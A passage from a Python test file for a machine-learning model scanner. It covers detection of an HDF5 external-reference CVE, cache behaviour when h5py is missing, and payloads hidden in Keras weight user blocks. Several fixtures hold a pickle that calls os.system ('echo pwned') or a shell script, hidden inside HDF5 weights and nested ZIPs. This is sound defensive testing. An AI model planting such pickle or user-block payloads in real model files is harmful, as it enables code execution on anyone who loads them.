            "3.12.1-rc.1",
            "3.12.1_rc_1",
            "3.12.1rc.post",
            "3.12.1rc1.post1",
            "3.12.1rc1.post.dev",
            "3.12.1rc1+cpu",
            "3.12.1a0",
            "3.12.1.dev0",
            "3.13.2rc1",
            "3.13.2dev0",
        ],
    )
    def test_embedded_hdf5_external_references_prerelease_fixes_are_vulnerable(
        self, tmp_path: Path, keras_version: str
    ) -> None:
        """Prereleases of the fixed CVE-2026-1669 versions are still vulnerable."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version=keras_version,
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["keras_version"] == keras_version
        assert cve_issues[0].severity == IssueSeverity.WARNING

    @pytest.mark.parametrize(
        "keras_version",
        [
            "3.12.1",
            "3.12.1+cpu",
            "3.12.1+rc1",
            "3.12.1.post",
            "3.12.1rev",
            "3.12.1-r",
            "3.12.1.post.dev",
            "3.13.2",
            "3.13.2.post1",
            "3.13.2+dev0",
        ],
    )
    def test_embedded_hdf5_external_references_fixed_metadata_still_warn(
        self, tmp_path: Path, keras_version: str
    ) -> None:
        """Metadata.json version text is archive-controlled context, not a suppression guard."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version=keras_version,
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.WARNING
        assert cve_issues[0].details["keras_version"] == keras_version
        assert cve_issues[0].details["parse_status"] == "metadata_non_vulnerable"
        assert cve_issues[0].details["metadata_only_assessment"] is True
        assert any(
            check.name == "HDF5 External Weight Reference Metadata Check" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    @pytest.mark.parametrize(
        "keras_version",
        [
            "3.12.1rc1evil",
            "3.12.1rc1.evil",
            "3.12.1rc1+cpu+cuda",
            "3.12.1--rc1",
            "3.12.1candidate",
            "3.12.1+",
            "3.12.1+cpu+cuda",
            "3.13.2.postevil",
            "keras-3.12.1",
            "keras-3.13.2",
            "3.13.x",
        ],
    )
    def test_embedded_hdf5_external_references_unparseable_metadata_warns_unknown(
        self, tmp_path: Path, keras_version: str
    ) -> None:
        """Malformed archive metadata must not claim vulnerable or fixed runtime behavior."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version=keras_version,
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        unknown_checks = [
            check for check in result.checks if check.name == "HDF5 External Weight Reference Risk (Version Unknown)"
        ]
        assert len(unknown_checks) == 1
        assert unknown_checks[0].status == CheckStatus.FAILED
        assert unknown_checks[0].severity == IssueSeverity.WARNING
        assert unknown_checks[0].details["keras_version"] == keras_version
        assert unknown_checks[0].details["parse_status"] == "unknown"
        assert "is non-canonical" in unknown_checks[0].message

    @pytest.mark.parametrize(
        "keras_version",
        ["3.11.3rc1evil", "3.12.0rc1evil", "3.13.1+bad+tag"],
    )
    def test_cve_2026_1669_noncanonical_suffix_inside_vulnerable_range_is_attributed(
        self,
        tmp_path: Path,
        keras_version: str,
    ) -> None:
        """Malformed suffixes cannot erase an unambiguously vulnerable numeric release."""
        assert KerasZipScanner._is_vulnerable_to_cve_2026_1669(keras_version) is True

        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version=keras_version,
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        cve_checks = [check for check in result.checks if check.name.startswith("CVE-2026-1669:")]
        unknown_checks = [
            check for check in result.checks if check.name == "HDF5 External Weight Reference Risk (Version Unknown)"
        ]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].details["keras_version"] == keras_version
        assert unknown_checks == []

    @pytest.mark.parametrize("keras_version", ["3.0.x", "3.11.x", "3.11-X", "3.0.*", "3.11.*", "3.11-*"])
    def test_cve_2026_1669_wildcard_line_entirely_in_vulnerable_range(self, keras_version: str) -> None:
        """A wildcard cannot hide a minor line whose every release is vulnerable."""
        assert KerasZipScanner._is_vulnerable_to_cve_2026_1669(keras_version) is True

    @pytest.mark.parametrize("keras_version", ["3.12.x", "3.13.x", "3.12.*", "3.13.*"])
    def test_cve_2026_1669_wildcard_line_crossing_fix_boundary_is_unknown(self, keras_version: str) -> None:
        """Minor lines containing both vulnerable and fixed patches remain unknown."""
        assert KerasZipScanner._is_vulnerable_to_cve_2026_1669(keras_version) is None

    @pytest.mark.parametrize("keras_version", ["2.15.x", "3.14.x", "4.0.x", "2.15.*", "3.14.*", "4.0.*"])
    def test_cve_2026_1669_wildcard_line_outside_vulnerable_range_is_fixed(self, keras_version: str) -> None:
        """Wildcard lines wholly outside the vulnerable ranges are not attributed to the CVE."""
        assert KerasZipScanner._is_vulnerable_to_cve_2026_1669(keras_version) is False

    def test_benign_embedded_weights_do_not_emit_warning_noise(self, tmp_path: Path) -> None:
        """Benign embedded weights should not produce warning or critical noise."""
        scanner = KerasZipScanner()
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.13.2",
            weights_h5_path=create_regular_weights_h5(tmp_path),
        )

        result = scanner.scan(str(keras_path))

        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_embedded_hdf5_cache_bypass_depends_on_runtime_h5py(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        keras_path = tmp_path / "embedded-weights.keras"
        with zipfile.ZipFile(keras_path, "w") as archive:
            archive.writestr("config.json", "{}")
            archive.writestr("model.weights.h5", b"placeholder")

        monkeypatch.setattr(cache_decorator_module, "_h5py_runtime_available", lambda: True)
        assert cache_decorator_module.should_bypass_cache_for_unavailable_hdf5_analysis(str(keras_path)) is False

        monkeypatch.setattr(cache_decorator_module, "_h5py_runtime_available", lambda: False)
        assert cache_decorator_module.should_bypass_cache_for_unavailable_hdf5_analysis(str(keras_path)) is True

    def test_embedded_hdf5_weights_use_cache_when_h5py_is_available(self, tmp_path: Path) -> None:
        """Fully analyzed embedded HDF5 weights should retain normal cache behavior."""
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            weights_h5_path=create_regular_weights_h5(tmp_path),
        )
        cache_dir = tmp_path / "embedded-hdf5-cache"

        reset_cache_manager()
        try:
            first = scan_model_directory_or_file(
                str(keras_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            assert determine_exit_code(first) == 0

            cache_manager = get_cache_manager(str(cache_dir), enabled=True)
            first_stats = cache_manager.get_stats()
            assert first_stats["total_entries"] > 0

            second = scan_model_directory_or_file(
                str(keras_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            assert determine_exit_code(second) == 0

            second_stats = cache_manager.get_stats()
            assert second_stats["total_entries"] == first_stats["total_entries"]
            assert second_stats["cache_hits"] > first_stats["cache_hits"]
        finally:
            reset_cache_manager()

    def test_embedded_weights_missing_h5py_returns_exit2_and_skips_cache(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Embedded HDF5 weights cannot be considered fully scanned without h5py."""
        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        reason = "keras_zip_embedded_weights_h5py_unavailable"
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=create_external_link_weights_h5(tmp_path),
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert reason in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Embedded Weights H5PY Library Check"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "model.weights.h5"
            and check.details["scan_outcome_reason"] == reason
            for check in result.checks
        )
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

        cache_dir = tmp_path / "missing-h5py-cache"
        reset_cache_manager()
        try:
            first_result = scan_model_directory_or_file(
                str(keras_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            second_result = scan_model_directory_or_file(
                str(keras_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

            for audit_result in (first_result, second_result):
                metadata = audit_result.file_metadata[str(keras_path)]
                assert determine_exit_code(audit_result) == 2
                assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
                assert reason in metadata.get("scan_outcome_reasons")
                assert not any(
                    issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in audit_result.issues
                )

            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        finally:
            reset_cache_manager()

    def test_embedded_weights_missing_h5py_invalidates_stale_cache_entries(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A clean cached Keras ZIP must not hide newly unavailable HDF5 analysis."""
        reason = "keras_zip_embedded_weights_h5py_unavailable"
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            weights_h5_path=create_regular_weights_h5(tmp_path),
        )
        cache_dir = tmp_path / "stale-missing-h5py-cache"

        reset_cache_manager()
        try:
            original_bypass = cache_decorator_module.should_bypass_cache_for_unavailable_hdf5_analysis
            monkeypatch.setattr(
                cache_decorator_module,
                "should_bypass_cache_for_unavailable_hdf5_analysis",
                lambda _path: False,
            )
            first_result = scan_model_directory_or_file(
                str(keras_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            assert determine_exit_code(first_result) == 0
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0
            monkeypatch.setattr(
                cache_decorator_module,
                "should_bypass_cache_for_unavailable_hdf5_analysis",
                original_bypass,
            )

            monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
            monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)

            second_result = scan_model_directory_or_file(
                str(keras_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            metadata = second_result.file_metadata[str(keras_path)]

            assert determine_exit_code(second_result) == 2
            assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
            assert reason in metadata.get("scan_outcome_reasons")
        finally:
            reset_cache_manager()

    def test_embedded_weights_runtime_h5py_failure_bypasses_stale_cache(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            weights_h5_path=create_regular_weights_h5(tmp_path),
        )
        cache_dir = tmp_path / "runtime-h5py-failure-cache"

        reset_cache_manager()
        try:
            original_bypass = cache_decorator_module.should_bypass_cache_for_unavailable_hdf5_analysis
            monkeypatch.setattr(
                cache_decorator_module,
                "should_bypass_cache_for_unavailable_hdf5_analysis",
                lambda _path: False,
            )
            clean_result = scan_model_directory_or_file(
                str(keras_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            assert determine_exit_code(clean_result) == 0
            cache_manager = get_cache_manager(str(cache_dir), enabled=True)
            cached_entries = cache_manager.get_stats()["total_entries"]
            assert cached_entries > 0
            monkeypatch.setattr(
                cache_decorator_module,
                "should_bypass_cache_for_unavailable_hdf5_analysis",
                original_bypass,
            )

            def fail_h5py_open(*args: Any, **kwargs: Any) -> Any:
                raise RuntimeError("simulated h5py runtime failure")

            monkeypatch.setattr(keras_zip_scanner_module.h5py, "File", fail_h5py_open)

            failed_result = scan_model_directory_or_file(
                str(keras_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            metadata = failed_result.file_metadata[str(keras_path)]

            assert determine_exit_code(failed_result) == 2
            assert "keras_zip_scan_failed" in metadata["scan_outcome_reasons"]
            assert cache_manager.get_stats()["total_entries"] == cached_entries
        finally:
            reset_cache_manager()

    def test_normalized_embedded_weights_bypass_stale_cache(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        weights_path = create_regular_weights_h5(tmp_path)
        keras_path = tmp_path / "normalized-members.keras"
        with zipfile.ZipFile(keras_path, "w") as archive:
            archive.writestr("./config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
            archive.writestr("./metadata.json", json.dumps({"keras_version": "3.13.2"}))
            archive.write(weights_path, "./model.weights.h5")
        cache_dir = tmp_path / "normalized-members-cache"

        reset_cache_manager()
        try:
            original_bypass = cache_decorator_module.should_bypass_cache_for_unavailable_hdf5_analysis
            monkeypatch.setattr(
                cache_decorator_module,
                "should_bypass_cache_for_unavailable_hdf5_analysis",
                lambda _path: False,
            )
            clean_result = scan_model_directory_or_file(
                str(keras_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            assert determine_exit_code(clean_result) == 0
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0
            monkeypatch.setattr(
                cache_decorator_module,
                "should_bypass_cache_for_unavailable_hdf5_analysis",
                original_bypass,
            )

            def fail_h5py_open(*_args: Any, **_kwargs: Any) -> None:
                raise RuntimeError("simulated normalized-member h5py failure")

            monkeypatch.setattr(keras_zip_scanner_module.h5py, "File", fail_h5py_open)

            failed_result = scan_model_directory_or_file(
                str(keras_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            metadata = failed_result.file_metadata[str(keras_path)]

            assert determine_exit_code(failed_result) == 2
            assert "keras_zip_scan_failed" in metadata["scan_outcome_reasons"]
        finally:
            reset_cache_manager()

    @pytest.mark.parametrize("libver", [None, "latest"])
    def test_userblock_embedded_weights_missing_h5py_returns_exit2(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        libver: str | None,
    ) -> None:
        """HDF5 weights with a user block should still fail closed when h5py is unavailable."""
        if h5py is None:
            pytest.skip("h5py not available")
        weights_path = tmp_path / "userblock.weights.h5"
        h5_kwargs: dict[str, Any] = {"userblock_size": 512}
        if libver is not None:
            h5_kwargs["libver"] = libver
        with h5py.File(weights_path, "w", **h5_kwargs) as h5_file:
            h5_file.create_dataset("kernel", data=[1.0, 2.0])
        assert weights_path.read_bytes()[512 : 512 + 8] == b"\x89HDF\r\n\x1a\n"

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        reason = "keras_zip_embedded_weights_h5py_unavailable"
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=weights_path,
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert reason in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Embedded Weights H5PY Library Check"
            and check.status == CheckStatus.FAILED
            and check.details["hdf5_signature_offset"] == 512
            and check.details["scan_outcome_reason"] == reason
            for check in result.checks
        )
        assert not any(check.name == "H5PY Library Check" for check in result.checks)
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    @pytest.mark.parametrize(("op_type", "malicious"), [("Relu", False), ("PythonOp", True)])
    def test_magic_only_embedded_weights_preserve_full_onnx_dispatch(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        op_type: str,
        malicious: bool,
    ) -> None:
        """HDF5 magic inside a non-HDF payload must not suppress its real scanner."""
        pytest.importorskip("onnx")
        weights_path = create_mock_onnx(tmp_path / "magic_only.weights.h5", op_type=op_type)
        prefix_mock_onnx_with_unknown_field(weights_path, value_size=1024)
        weights_payload = bytearray(weights_path.read_bytes())
        weights_payload[512 : 512 + 8] = b"\x89HDF\r\n\x1a\n"
        weights_path.write_bytes(weights_payload)

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=weights_path,
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert "keras_zip_embedded_weights_h5py_unavailable" not in result.metadata.get("scan_outcome_reasons", [])
        assert "keras_h5_h5py_unavailable" not in result.metadata.get("scan_outcome_reasons", [])
        assert not any(
            check.name in {"Embedded Weights H5PY Library Check", "H5PY Library Check"} for check in result.checks
        )
        python_op_findings = [issue for issue in result.issues if issue.details.get("op_type") == "PythonOp"]
        assert bool(python_op_findings) is malicious
        assert (
            bool(
                [issue for issue in result.issues if issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL)]
            )
            is malicious
        )

    def test_plausible_hdf5_superblock_preserves_full_onnx_security_dispatch(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A spoofed plausible superblock must not hide a malicious polyglot payload."""
        pytest.importorskip("onnx")
        weights_path = create_mock_onnx(tmp_path / "polyglot.weights.h5", op_type="PythonOp")
        prefix_mock_onnx_with_unknown_field(weights_path, value_size=1024)
        weights_payload = bytearray(weights_path.read_bytes())
        weights_path.write_bytes(_embed_plausible_hdf5_superblock(bytes(weights_payload), 512))

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=weights_path,
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.metadata["embedded_weights_hdf5_signature_offset"] == 512
        assert any(
            issue.details.get("op_type") == "PythonOp"
            and issue.details.get("zip_entry") == "model.weights.h5"
            and issue.details.get("embedded_weights_hdf5_userblock") is True
            for issue in result.issues
        )
        assert not any(check.name == "H5PY Library Check" for check in result.checks)

    def test_userblock_embedded_weights_preserves_generic_security_scan(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Missing h5py must not suppress malicious bytes stored before the user-block signature."""
        pickle_payload = b'cos\nsystem\n(S"echo pwned"\ntR.'
        weights_path = tmp_path / "userblock_pickle.weights.h5"
        weights_path.write_bytes(_embed_plausible_hdf5_superblock(pickle_payload, 512))
        assert weights_path.read_bytes()[512 : 512 + 8] == b"\x89HDF\r\n\x1a\n"

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=weights_path,
        )

        result = KerasZipScanner(config={"scanners": ["keras_zip"]}).scan(str(keras_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert result.metadata["embedded_weights_hdf5_signature_offset"] == 512
        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "model.weights.h5"
            and issue.details.get("embedded_weights_hdf5_userblock") is True
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )
        assert not any(check.name == "H5PY Library Check" for check in result.checks)

    def test_userblock_embedded_weights_preserves_nested_archive_dispatch(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Missing h5py must content-route structured payloads stored in the HDF5 user block."""
        hdf5_signature_offset = 1024 * 1024
        nested_zip_path = tmp_path / "userblock_payload.zip"
        with zipfile.ZipFile(nested_zip_path, "w") as nested_zip:
            nested_zip.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')

        nested_zip_payload = nested_zip_path.read_bytes()
        assert len(nested_zip_payload) < hdf5_signature_offset
        weights_path = tmp_path / "userblock_zip.weights.h5"
        weights_path.write_bytes(_embed_plausible_hdf5_superblock(nested_zip_payload, hdf5_signature_offset))

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=weights_path,
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert result.metadata["embedded_weights_hdf5_signature_offset"] == hdf5_signature_offset
        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "model.weights.h5:payload.pkl"
            and issue.details.get("embedded_weights_hdf5_userblock") is True
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )
        assert not any(check.name == "H5PY Library Check" for check in result.checks)

    @pytest.mark.parametrize("malicious", [False, True])
    def test_userblock_embedded_weights_scans_concatenated_zip_archives(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        malicious: bool,
    ) -> None:
        """A benign trailing ZIP must not hide an earlier user-block archive."""
        first_zip_path = tmp_path / "first.zip"
        with zipfile.ZipFile(first_zip_path, "w") as first_zip:
            if malicious:
                first_zip.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')
            else:
                first_zip.writestr("README-first.txt", b"benign first archive")

        second_zip_path = tmp_path / "second.zip"
        with zipfile.ZipFile(second_zip_path, "w") as second_zip:
            second_zip.writestr("README-second.txt", b"benign trailing archive")

        hdf5_signature_offset = 1024
        userblock_payload = first_zip_path.read_bytes() + second_zip_path.read_bytes()
        assert len(userblock_payload) < hdf5_signature_offset
        weights_path = tmp_path / "concatenated_zip_userblock.weights.h5"
        weights_path.write_bytes(_embed_plausible_hdf5_superblock(userblock_payload, hdf5_signature_offset))

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=weights_path,
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.metadata["embedded_weights_hdf5_signature_offset"] == hdf5_signature_offset
        pickle_findings = [
            issue
            for issue in result.issues
            if issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "model.weights.h5:payload.pkl"
            and issue.details.get("embedded_weights_hdf5_userblock") is True
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
        ]
        assert bool(pickle_findings) is malicious
        assert (
            bool(
                [issue for issue in result.issues if issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL)]
            )
            is malicious
        )

    def test_userblock_embedded_weights_does_not_pickle_scan_selection_skipped_zip(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A recognized user-block ZIP must not be reinterpreted as pickle when ZIP scanning is disabled."""
        nested_zip_path = tmp_path / "userblock_payload.zip"
        with zipfile.ZipFile(nested_zip_path, "w") as nested_zip:
            nested_zip.writestr("README.txt", b"benign user-block archive")

        nested_zip_payload = nested_zip_path.read_bytes()
        hdf5_signature_offset = 512
        assert len(nested_zip_payload) < hdf5_signature_offset
        weights_path = tmp_path / "userblock_zip.weights.h5"
        weights_path.write_bytes(_embed_plausible_hdf5_superblock(nested_zip_payload, hdf5_signature_offset))

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)

        def fail_pickle_scan(*args: Any, **kwargs: Any) -> Any:
            pytest.fail("recognized ZIP user-block content must not fall back to pickle scanning")

        monkeypatch.setattr(PickleScanner, "scan_stream", fail_pickle_scan)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=weights_path,
        )

        result = KerasZipScanner(config={"scanners": ["keras_zip"]}).scan(str(keras_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert result.metadata["embedded_weights_hdf5_signature_offset"] == hdf5_signature_offset
        assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_userblock_embedded_weights_does_not_hide_content_after_zip_end_record(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A valid early ZIP end record must not discard later non-padding user-block content."""
        hdf5_signature_offset = 1024 * 1024
        empty_zip_path = tmp_path / "empty.zip"
        with zipfile.ZipFile(empty_zip_path, "w"):
            pass

        pickle_payload = b'cos\nsystem\n(S"echo pwned"\ntR.'
        userblock_payload = empty_zip_path.read_bytes() + pickle_payload
        assert len(userblock_payload) < hdf5_signature_offset
        weights_path = tmp_path / "zip_then_pickle.weights.h5"
        weights_path.write_bytes(_embed_plausible_hdf5_superblock(userblock_payload, hdf5_signature_offset))

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=weights_path,
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.metadata["embedded_weights_hdf5_signature_offset"] == hdf5_signature_offset
        assert any(
            issue.rule_code == "S201"
            and issue.details.get("zip_entry") == "model.weights.h5"
            and issue.details.get("embedded_weights_hdf5_userblock") is True
            and any(global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system"))
            for issue in result.issues
        )

    @pytest.mark.parametrize("malicious", [False, True])
    def test_userblock_embedded_weights_handles_zip_before_large_nonzero_trailer(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        malicious: bool,
    ) -> None:
        """Later user-block data must not hide a valid earlier nested ZIP payload."""
        hdf5_signature_offset = 1024 * 1024
        nested_zip_path = tmp_path / "userblock_payload.zip"
        with zipfile.ZipFile(nested_zip_path, "w", compression=zipfile.ZIP_DEFLATED) as nested_zip:
            if malicious:
                nested_zip.writestr("payload.pkl", b'cos\nsystem\n(S"echo pwned"\ntR.')
            else:
                nested_zip.writestr("README.txt", b"benign user-block archive")

        nested_zip_payload = nested_zip_path.read_bytes()
        userblock_payload = nested_zip_payload + (b"X" * (70 * 1024))
        assert len(userblock_payload) < hdf5_signature_offset
        weights_path = tmp_path / "zip_then_large_trailer.weights.h5"
        weights_path.write_bytes(_embed_plausible_hdf5_superblock(userblock_payload, hdf5_signature_offset))

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=weights_path,
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.metadata["embedded_weights_hdf5_signature_offset"] == hdf5_signature_offset
        security_findings = [
            issue for issue in result.issues if issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL)
        ]
        nested_pickle_findings = [
            issue
            for issue in security_findings
            if (
                issue.rule_code == "S201"
                and issue.details.get("zip_entry") == "model.weights.h5:payload.pkl"
                and issue.details.get("embedded_weights_hdf5_userblock") is True
                and any(
                    global_name in issue.message.lower() for global_name in ("os.system", "posix.system", "nt.system")
                )
            )
        ]
        assert bool(nested_pickle_findings) is malicious
        assert bool(security_findings) is malicious

    def test_userblock_embedded_weights_preserves_executable_security_scan(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Missing h5py must not suppress generic executable checks for HDF5 user-block bytes."""
        if h5py is None:
            pytest.skip("h5py not available")
        weights_path = tmp_path / "userblock_shell.weights.h5"
        with h5py.File(weights_path, "w", userblock_size=512) as h5_file:
            h5_file.create_dataset("kernel", data=[1.0, 2.0])
        with weights_path.open("r+b") as weights_file:
            weights_file.write(b"#!/bin/sh\necho pwned\n")
        assert weights_path.read_bytes()[512 : 512 + 8] == b"\x89HDF\r\n\x1a\n"

        monkeypatch.setattr(keras_zip_scanner_module, "HAS_H5PY", False)
        monkeypatch.setattr(keras_h5_scanner_module, "HAS_H5PY", False)
        keras_path = create_configured_keras_zip(
            tmp_path,
            {"class_name": "Sequential", "config": {"layers": []}},
            keras_version="3.12.0",
            weights_h5_path=weights_path,
        )

        result = KerasZipScanner().scan(str(keras_path))

        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert result.metadata["embedded_weights_hdf5_signature_offset"] == 512
        assert any(
            issue.message == "Executable file found in ZIP archive: model.weights.h5"
